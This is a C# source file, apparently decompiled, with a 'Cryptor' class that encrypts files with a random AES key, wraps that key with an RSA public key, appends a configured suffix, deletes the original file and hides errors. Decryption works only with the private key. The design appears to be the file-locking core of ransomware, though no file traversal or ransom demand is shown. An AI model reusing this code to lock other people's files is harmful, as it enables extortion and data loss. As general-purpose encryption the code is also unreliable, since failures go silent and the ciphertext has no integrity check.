using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Extension;

public static class Cryptor
{
	public static Random Random = new Random();

	public static string GetRandomString(int length)
	{
		return new string((from s in Enumerable.Repeat("0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", length)
			select s[Random.Next(s.Length)]).ToArray());
	}

	public static byte[] EncryptData(byte[] data, string publicKey)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.FromXmlString(publicKey);
		return rSACryptoServiceProvider.Encrypt(data, fOAEP: true);
	}

	public static byte[] DecryptData(byte[] data, string privateKey)
	{
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider();
		rSACryptoServiceProvider.FromXmlString(privateKey);
		if (rSACryptoServiceProvider.PublicOnly)
		{
			throw new Exception("The key provided is a public key and does not contain the private key elements required for decryption");
		}
		return rSACryptoServiceProvider.Decrypt(data, fOAEP: true);
	}

	public static string EncryptString(string value, string publicKey)
	{
		return Convert.ToBase64String(EncryptData(Encoding.UTF8.GetBytes(value), publicKey));
	}

	public static string DecryptString(string value, string privateKey)
	{
		return Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(value), privateKey));
	}

	public static bool EncryptFile(string inputFilePath, string publicKey)
	{
		try
		{
			if (new FileInfo(inputFilePath).Length > 100000000L)
			{
				return false;
			}
			using (AesManaged aesManaged = new AesManaged())
			{
				byte[] array = new byte[aesManaged.KeySize / 8];
				byte[] array2 = new byte[aesManaged.BlockSize / 8];
				using (RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider())
				{
					rNGCryptoServiceProvider.GetBytes(array);
					rNGCryptoServiceProvider.GetBytes(array2);
				}
				byte[] array3 = new byte[array.Length + array2.Length];
				Array.Copy(array, array3, array.Length);
				Array.Copy(array2, 0, array3, array.Length, array2.Length);
				array3 = EncryptData(array3, publicKey);
				byte[] bytes = BitConverter.GetBytes(array3.Length);
				using ICryptoTransform transform = aesManaged.CreateEncryptor(array, array2);
				using FileStream fileStream2 = new FileStream(inputFilePath, FileMode.Open);
				using FileStream fileStream = new FileStream(inputFilePath + Config.EncryptedFileSuffix, FileMode.Create);
				using CryptoStream destination = new CryptoStream(fileStream, transform, CryptoStreamMode.Write);
				fileStream.Write(bytes, 0, bytes.Length);
				fileStream.Write(array3, 0, array3.Length);
				fileStream2.CopyTo(destination);
			}
			File.Delete(inputFilePath);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool DecryptFile(string inputFilePath, string privateKey)
	{
		try
		{
			if (!inputFilePath.EndsWith(Config.EncryptedFileSuffix))
			{
				return false;
			}
			using (AesManaged aesManaged = new AesManaged())
			{
				using FileStream fileStream = new FileStream(inputFilePath, FileMode.Open);
				byte[] array = new byte[4];
				fileStream.Read(array, 0, array.Length);
				array = new byte[BitConverter.ToInt32(array, 0)];
				fileStream.Read(array, 0, array.Length);
				array = DecryptData(array, privateKey);
				byte[] array2 = new byte[aesManaged.KeySize / 8];
				byte[] array3 = new byte[aesManaged.BlockSize / 8];
				Array.Copy(array, array2, array2.Length);
				Array.Copy(array, array2.Length, array3, 0, array3.Length);
				using ICryptoTransform transform = aesManaged.CreateDecryptor(array2, array3);
				using FileStream stream = new FileStream(inputFilePath.Remove(inputFilePath.Length - Config.EncryptedFileSuffix.Length, Config.EncryptedFileSuffix.Length), FileMode.Create);
				using CryptoStream destination = new CryptoStream(stream, transform, CryptoStreamMode.Write);
				fileStream.CopyTo(destination);
			}
			File.Delete(inputFilePath);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}
}
